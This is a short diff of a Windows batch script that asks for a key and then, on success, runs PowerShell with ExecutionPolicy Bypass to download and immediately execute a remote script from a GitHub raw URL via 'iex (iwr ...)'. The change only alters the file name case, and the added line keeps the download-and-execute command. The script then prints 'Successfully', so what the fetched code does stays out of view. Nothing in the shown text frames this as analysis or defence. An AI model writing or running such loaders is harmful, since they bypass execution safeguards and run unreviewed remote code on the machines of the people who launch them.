@@ -33,7 +33,7 @@ echo Invalid key
 goto input
 
 :ok
-powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/eiei/main/main.ps1')"
+powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/eiei/main/Main.ps1')"
 cls
 echo Successfully
 timeout /t 2 >nul
